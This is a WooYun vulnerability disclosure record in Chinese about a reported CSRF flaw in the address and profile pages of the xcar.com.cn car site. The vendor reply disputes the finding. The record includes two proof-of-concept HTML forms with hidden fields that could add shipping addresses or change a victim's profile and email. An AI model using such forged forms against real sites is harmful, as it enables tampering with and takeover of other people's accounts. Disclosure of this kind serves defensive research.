{"id": 36986, "wybug_id": "wooyun-2015-0100676", "wybug_title": "爱卡汽车网CSRF一枚", "wybug_corp": "爱卡汽车网", "wybug_author": "第四维度", "wybug_date": "2015-03-12 11:18", "wybug_open_date": "2015-03-16 11:05", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： CSRF 详细说明：  问题出在这里\nhttp://my.xcar.com.cn/set/address.php\n收货地址处，由于没有做好控制，导致可以添加任意收货地址。\n\n这是已经添加好的。\n\n接着我们构造表单，将收货人姓名修改一下。\n<form method=\"POST\" name=\"form0\" action=\"http://my.xcar.com.cn:80/set/address.php?action=add\"><input type=\"hidden\" name=\"type\" value=\"\"/><input type=\"hidden\" name=\"id\" value=\"\"/><input type=\"hidden\" name=\"uname\" value=\"22222\"/><input type=\"hidden\" name=\"sheng_id\" value=\"1\"/><input type=\"hidden\" name=\"shi_id\" value=\"2\"/><input type=\"hidden\" name=\"xian_id\" value=\"4\"/><input type=\"hidden\" name=\"address\" value=\"11111111111\"/><input type=\"hidden\" name=\"postid\" value=\"111111\"/><input type=\"hidden\" name=\"phone\" value=\"13800138000\"/><input type=\"hidden\" name=\"tel\" value=\"\"/><input type=\"hidden\" name=\"email\" value=\"\"/></form>\n然后我们看看情况\n\n可以看到已经添加了一个新的地址。基本信息处同样也存在CSRF，可以任意修改信息。\n\n这里先写上test1，我们重新构造表单。\n\n\n<form method=\"POST\" name=\"form0\" action=\"http://my.xcar.com.cn:80/set/account.php?action=profile\"><input type=\"hidden\" name=\"formhash\" value=\"f11a1ad3\"/><input type=\"hidden\" name=\"chkname\" value=\"\"/><input type=\"hidden\" name=\"mmvip\" value=\"10\"/><input type=\"hidden\" name=\"usernamenew\" value=\"768798545\"/><input type=\"hidden\" name=\"gendernew\" value=\"1\"/><input type=\"hidden\" name=\"pro_id\" value=\"\"/><input type=\"hidden\" name=\"c_id\" value=\"\"/><input type=\"hidden\" name=\"year\" value=\"2013\"/><input type=\"hidden\" name=\"month\" value=\"02\"/><input type=\"hidden\" name=\"day\" value=\"01\"/><input type=\"hidden\" name=\"qqnew\" value=\"\"/><input type=\"hidden\" name=\"sitenew\" value=\"http://\"/><input type=\"hidden\" name=\"emailnew\" value=\"915896501@qq.com\"/><input type=\"hidden\" name=\"signature_new\" value=\"this is the csrftest2\"/><input type=\"hidden\" name=\"signature_old\" value=\"this is the csrftest1\"/><input type=\"hidden\" name=\"editsubmit\" value=\"??\"/><input type=\"hidden\" name=\"#160;??\" value=\"\"/></form>\n\n\n可以看到 签名已经改了，并且我可以重置任意账号的邮箱，并且自动发送验证邮件！虽然有fromhash，但是没什么用。   漏洞证明：  \n\n   修复方案：  token   版权声明：转载请注明来源 第四维度@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-03-16 11:05 厂商回复： 感谢@第四维度 白帽子的帮助。但是我们测试发现，上面说的那个csrf没有复现，并且很久以前代码当中就判断了reffer来源，非本站来源直接跳转到首页。关于下面个人信息的csrf问题，因为上面表单中存在hash，洞主可能是用同一个账号来测试的这个csrf问题。form hash的存在是为了防止csrf问题，但是对于同一个用户的某个时间段内form hash可能不会变化，所以同一个用户测试可能成功，但是不同用户的hash是不一样的，所以这个也没有复现。再次感谢@第四维度 的帮助，如有不同意见，欢迎私信交流，我们会虚心听取。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}